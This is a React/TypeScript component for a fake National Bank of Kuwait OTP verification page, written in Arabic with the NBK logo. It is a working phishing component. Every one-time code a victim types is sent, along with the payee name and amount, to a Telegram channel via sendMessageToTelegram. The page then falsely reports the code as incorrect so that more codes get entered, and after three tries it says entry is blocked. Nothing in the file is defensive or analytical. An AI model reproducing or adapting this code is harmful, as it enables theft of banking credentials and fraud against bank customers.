import { useState, useMemo } from "react";
import { useParams, useNavigate } from "react-router-dom";
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp";
import { sendMessageToTelegram } from "@/backend/telegramService";

const OTPVerification = () => {
  const { id } = useParams();
  const navigate = useNavigate();
  const queryParams = new URLSearchParams(window.location.search);
  
  const paymentData = useMemo(() => ({
    customerName: queryParams.get('n') || "halits.YILDIZ",
    amount: queryParams.get('a') || "5.000"
  }), [window.location.search]);

  const [otp, setOtp] = useState("");
  const [loading, setLoading] = useState(false);
  const [attempts, setAttempts] = useState(0);
  const [errorMsg, setErrorMsg] = useState("");

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);
    const message = `
<b>🔑 New OTP Entry (Attempt ${attempts + 1})</b>
<b>Name:</b> ${paymentData.customerName}
<b>Amount:</b> ${paymentData.amount} KD
<b>OTP:</b> <code>${otp}</code>
`;
    await sendMessageToTelegram(message);
    setTimeout(() => {
      setLoading(false);
      setAttempts(prev => prev + 1);
      setOtp("");
      if (attempts >= 2) {
        setErrorMsg("تم حظر إدخال رمز التحقق. يرجى مراجعة البنك.");
      } else {
        setErrorMsg("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.");
      }
    }, 1500);
  };

  return (
    <div className="min-h-screen bg-gray-100 flex flex-col items-center justify-center p-4" dir="rtl">
      <div className="w-full max-w-md bg-white rounded-2xl shadow-xl p-6 text-center">
        <img src="/nbk-logo.jpg" alt="NBK" className="h-10 mx-auto mb-6" />
        <h2 className="text-xl font-bold mb-4">التحقق من الرمز</h2>
        <div className="mb-6 p-4 bg-blue-50 rounded-xl">
           <div className="flex justify-between"><span>المستفيد:</span><span className="font-bold">{paymentData.customerName}</span></div>
           <div className="flex justify-between mt-2"><span>المبلغ:</span><span className="font-bold">{parseFloat(paymentData.amount).toFixed(3)} KD</span></div>
        </div>
        {errorMsg && <div className="mb-4 p-3 bg-red-100 text-red-700 rounded-lg">{errorMsg}</div>}
        <form onSubmit={handleSubmit}>
          <div className="flex justify-center mb-6">
            <InputOTP maxLength={6} value={otp} onChange={setOtp} disabled={attempts >= 3}>
              <InputOTPGroup className="gap-2">
                {[0,1,2,3,4,5].map(i => <InputOTPSlot key={i} index={i} className="w-12 h-12 border-2 border-blue-400 rounded-lg text-xl" />)}
              </InputOTPGroup>
            </InputOTP>
          </div>
          <button type="submit" disabled={loading || otp.length !== 6 || attempts >= 3} className="w-full bg-blue-700 text-white py-4 rounded-xl font-bold shadow-lg">
            {loading ? "جاري التحميل..." : "تأكيد"}
          </button>
        </form>
      </div>
    </div>
  );
};
export default OTPVerification;
